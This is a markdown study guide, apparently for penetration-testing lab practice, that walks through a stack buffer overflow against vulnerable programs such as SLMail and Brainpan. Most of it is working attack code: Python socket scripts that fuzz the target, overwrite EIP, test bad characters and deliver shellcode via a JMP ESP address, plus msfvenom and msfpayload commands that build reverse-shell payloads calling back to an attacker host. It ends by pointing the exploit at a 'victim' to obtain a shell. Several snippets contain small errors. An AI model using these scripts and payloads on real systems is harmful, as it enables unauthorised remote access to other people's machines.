# **Buffer Overflow**

**Understanding BO from Basic -** https://www.radiojitter.com/buffer-overflow-exploit-part-1/

**BrainPan Exploit -** https://jagskap.blogspot.com/2019/06/brainpan-buffer-overflow.html

## **Exploit Overview**
```
1. Fuzzing
	a. Sending malformed data into application input
2. SLMAIL 5.50 MAil Server
	a. Found in 2005
	b. Affected pop3 pass command
3. Bad Characters
	a. 0x00 - Null byte is also used to terminate strings
	b. 0x0D - Carriage Return - Signifies that the end  of password is reached
	c. 0x0A - Line Feed
4. Use msfpayload	windows/shell_reverse_tcp LHOST=<IP> EXITFUNC=thread LPORT=<Port> R | msfencode -­‐b "\x00\x0a\x0d"
5. Vulnerable Machines/Application -
		a. Linux crossfire
		b. Minishare
		c. SLMAIL
		d. brainpan
```
#### **Easy Access to Next Step -**

1. Copy exe file to windows machine.
2. Run exe in Imunnity debugger.
3. Open a file and write the following command and save it as exploit.py.
```
import socket
import sys
host = 'IP'
port = <port>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
        print("Connecting to ")+str(host)
        s.connect((host,port))
        	  s.send()
        s.close()
        print("The message has been sent")
except:
        print("Unable to connect to ")+ str(host)
        sys.exit(0)
```
4. Run the following command -
```
python.exe <Path>\exploit.py
!mona config -set workingfolder c:\logs\%p
!mona pc 1000
!mona pattern_offset <33734132>
!mona findmsp → Safeseh- false
```
5. Send junk and EIP
```
import socket
host = <ip>
port = <port>                   # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
junk=b”A”*548
EIP = b’BBBB’
s.sendall(junk+EIP)
s.close()
print(“The message has been sent.”)
```
6. Find Bad Character -
```
import socket
host='<ip'
port=80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))         # Connects to the Port in Target machine
junk=b”A”*548
EIP = b’BBBB’
bad_char=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
s.sendall(junk+EIP+bad_char)
s.close()
print(“The message has been sent.”)
```
7.Click on ESP → Rightclick → Follow TCP Dump--> Look for the pattern. If the any character is missing remove the bad character and resend the payload.
8. View → Executable Module -->Safe SEH-->False
9. Rightclick → Search for → JMP ESP
10. Note the Address - 311712F3
11. Replace the EIP with the address as
```
import socket,sys
host = "127.0.0.1"
port = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
junk = (b'A'*524)
EIP = (b'\xF3\x12\x17\x31')
s.sendall(junk+EIP)
s.close()
print("The message has been sent.")
```
13. If EIP doesn't get overwritten try adding nops and see if you can see that in ESP.
```
import socket,sys
host = "<ip>"
port = <port>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print "Connecting to " +str(host)
    s.connect((host,port))
    s.recv(1024)
    junk = b"A"*524
    EIP = b'\xf3\x12\x17\x31'
    nops = b"C"*10+b"D"*10
    print "Sending Payload..."
    s.sendall(junk+EIP+nops+payload)
    print "Sent"
except:
    print "Unable to connect " + str(host)
    sys.exit(0)
```
14. ESP shows first 10 D.
15. Create a shell code
```
msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> R -e x86/shikata_ga_nai -b '\x00' -f c
```
16. Listen on <attacker port> on attacker machine
17. Final payload
```
import socket,sys
host = "<ip>"
port = <port>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print "Connecting to " +str(host)
    s.connect((host,port))
    s.recv(1024)
    junk = b"A"*524
    EIP = b'\xf3\x12\x17\x31'
    nops = b"\x90"*10
		shellcode = b"...."
    print "Sending Payload..."
    s.sendall(junk+EIP+nops+shellcode)
    print "Sent"
except:
    print "Unable to connect " + str(host)
    sys.exit(0)
```
18. Got shell!! Bingo!!
19. Create a payload for linux machine by using the following code
		#**msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<port> R -e x86/shikata_ga_nai -b '\x00' -f c**
20. Change the host to vicktims IP and execute python code.
21. Got Victims Shell!! Cheers!
